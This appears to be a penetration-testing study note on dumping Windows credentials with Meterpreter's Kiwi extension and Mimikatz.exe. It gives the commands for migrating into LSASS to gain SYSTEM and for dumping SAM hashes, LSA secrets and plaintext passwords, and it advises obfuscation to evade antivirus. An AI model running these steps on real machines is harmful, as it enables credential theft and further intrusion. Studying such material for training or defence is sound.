# Mimikatz & Kiwi :

## What Is Mimikatz?

- **Post-exploitation tool** by Benjamin Delpy (`@gentilkiwi`)
- Extracts from **LSASS memory**:
  - **Plaintext passwords**
  - **NTLM hashes**
  - **Kerberos tickets**
- Requires **SYSTEM privileges** (LSASS is protected)

---
## Kiwi vs Mimikatz: What’s the Difference?

| | **Kiwi** | **Mimikatz.exe** |
|---|--------|----------------|
| **Form** | Meterpreter **extension** (built-in) | Standalone **executable** |
| **Usage** | `load kiwi` inside Meterpreter | Upload & run `.exe` on target |
| **Capabilities** | Subset of Mimikatz (most common functions) | **Full feature set** |
| **Stealth** | Runs in-memory (no disk write) | Writes file to disk (may trigger AV) |

> ✅ **Kiwi = Mimikatz integrated into Metasploit**  
> 🔥 Use **Kiwi first**; fall back to **Mimikatz.exe** if you need advanced features.

---
## Full Workflow Explained

### Step 1: Initial Access

- Exploit **BadBlue** → get Meterpreter as `DOMAIN\Administrator`
- But: You’re **not SYSTEM yet** → can’t dump LSASS

### Step 2: Privilege Escalation via Migration

```msf
pgrep lsass    # Find LSASS PID (e.g., 788)
migrate 788    # Inject Meterpreter into LSASS process
```

> ❓ **Why does this work?**  
> - LSASS runs as **NT AUTHORITY\SYSTEM**  
> - By migrating into it, your Meterpreter **inherits SYSTEM privileges**  
> - Now you can access LSASS memory → dump credentials

✅ Result: `getuid` now shows `NT AUTHORITY\SYSTEM`

---
### Step 3: Dump Credentials with Kiwi

```msf
load kiwi
creds_all              # Shows current session creds (domain admin)
lsa_dump_sam           # Dumps **all local SAM accounts** (RID 500, 501, etc.)
lsa_dump_secrets       # Dumps LSA secrets (sometimes plaintext)
```

> ❓ **Why does `lsa_dump_sam` show more users than `creds_all`?**  
> - `creds_all` = only **currently logged-in sessions**  
> - `lsa_dump_sam` = **entire local SAM database** (all local accounts)

---
### Step 4: Why Upload Mimikatz.exe?

Even with Kiwi, you might need **Mimikatz.exe** for:
- **`sekurlsa::logonpasswords`** → shows **plaintext passwords** (if stored in memory)
- More reliable **LSA dumping** in some environments
- Advanced Kerberos attacks (e.g., Golden Ticket)
#### Steps:
```msf
mkdir C:\\Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe C:\\Temp\\
shell
C:\Temp> mimikatz.exe
```

> ❓ **Why not just use `shell`?**  
> - `shell` gives **cmd.exe**, but you need **Mimikatz** for credential extraction  
> - Mimikatz requires **debug privileges** → next step:

```mimikatz
privilege::debug   # Enables SeDebugPrivilege (required for LSASS access)
sekurlsa::logonpasswords  # Show plaintext passwords + hashes
lsadump::sam       # Same as Kiwi, but often more detailed
```

---
## Key Clarifications

### 🔑 What Is the SYSKEY?

- **SYSKEY** = encryption key for SAM/LSA secrets (Windows XP–10)
- In modern Windows (Vista+), it’s **auto-managed** → rarely needed for attacks
- Mimikatz/Kiwi **automatically handle SYSKEY** — you don’t need to extract it manually

### 🧠 Why Both Kiwi and Mimikatz?

- **Kiwi**: Fast, in-memory, no disk artifacts  
- **Mimikatz.exe**: Full power, plaintext passwords, better compatibility

> 💡 **Best practice**:  
> 1. Try `kiwi` first  
> 2. If it fails or you need plaintext → upload `mimikatz.exe`

---
## Critical Notes

- **Always migrate to LSASS** (or use `getsystem`) before dumping creds
- **Domain Admin ≠ SYSTEM** — you need **local SYSTEM** to dump LSASS
- **Mimikatz triggers AV** — use reflective loading or obfuscation in real ops

> 🔥 **Golden rule**:  
> **SYSTEM + LSASS access = All credentials on the machine.**

